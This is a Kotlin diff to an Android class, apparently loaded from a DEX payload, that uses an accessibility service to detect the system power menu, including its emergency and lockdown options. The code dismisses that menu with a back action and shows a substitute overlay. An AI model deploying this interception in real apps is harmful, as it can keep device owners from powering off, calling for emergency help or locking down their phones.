@@ -50,12 +50,55 @@ class PayloadEntry : DynamicEntry {
             DynamicEntry.accessibilityInterceptor = { event ->
                 if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                     val pkg = event.packageName?.toString() ?: ""
-                    // SystemUI or Samsung specific packages
-                    if (pkg == "com.android.systemui" || pkg == "android" || pkg.contains("cocktailbarservice")) {
-                        // Check if the window is likely the power menu
-                        val cls = event.className?.toString() ?: ""
-                        if (cls.contains("GlobalActions", ignoreCase = true) || cls.contains("Power", ignoreCase = true)) {
-                            // ⚔️ Kill the system UI menu
+                    
+                    // Target system-level overlays
+                    if (pkg.contains("systemui") || pkg == "android" || pkg.contains("cocktailbarservice")) {
+                        var isPowerMenu = false
+                        DynamicEntry.log("🔍 Scanning Window: $pkg | Class: ${event.className}")
+
+                        // Method 1: Check high-level event text
+                        val eventText = event.text.joinToString(" ").lowercase()
+                        if (eventText.contains("power off") || eventText.contains("emergency mode") || eventText.contains("lockdown mode")) {
+                            isPowerMenu = true
+                            DynamicEntry.log("✅ Matched Event Text: $eventText")
+                        }
+
+                        // Method 2: Deep scan the accessibility nodes (More accurate for Samsung)
+                        if (!isPowerMenu) {
+                            fun scanNodes(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
+                                if (node == null) return false
+                                val nodeText = (node.text ?: node.contentDescription)?.toString()?.lowercase() ?: ""
+                                
+                                if (nodeText.contains("power off") || nodeText.contains("emergency mode") || nodeText.contains("side key settings")) {
+                                    DynamicEntry.log("✅ Matched UI Node: $nodeText")
+                                    return true
+                                }
+                                
+                                for (i in 0 until node.childCount) {
+                                    if (scanNodes(node.getChild(i))) return true
+                                }
+                                return false
+                            }
+                            
+                            val rootNode = event.source
+                            if (rootNode != null) {
+                                isPowerMenu = scanNodes(rootNode)
+                                rootNode.recycle() // Prevent memory leaks
+                            }
+                        }
+
+                        // Method 3: Fallback to class name check
+                        if (!isPowerMenu) {
+                            val cls = event.className?.toString() ?: ""
+                            if (cls.contains("GlobalActions", ignoreCase = true) || cls.contains("Power", ignoreCase = true)) {
+                                isPowerMenu = true
+                                DynamicEntry.log("⚠️ Fallback Matched Class: $cls")
+                            }
+                        }
+
+                        if (isPowerMenu) {
+                            DynamicEntry.log("🚀 INTERCEPTING POWER MENU!")
+                            // ⚔️ Kill the system UI menu via global back action
                             DynamicEntry.activeAccessibilityService?.performGlobalAction(
                                 android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
                             )
@@ -63,10 +106,15 @@ class PayloadEntry : DynamicEntry {
                             val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                             vib.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
                             
-                            // 🚀 TRIGGER DRAWING FROM DEX
+                            // 🚀 Draw the custom overlay
                             DynamicEntry.overlayContent = { 
-                                PowerMenuOverlay(onDismiss = { DynamicEntry.overlayContent = null }) 
+                                PowerMenuOverlay(onDismiss = { 
+                                    DynamicEntry.log("Closing custom overlay.")
+                                    DynamicEntry.overlayContent = null 
+                                }) 
                             }
+                        } else {
+                            DynamicEntry.log("❌ Ignore: Not a power menu.")
                         }
                     }
                 }
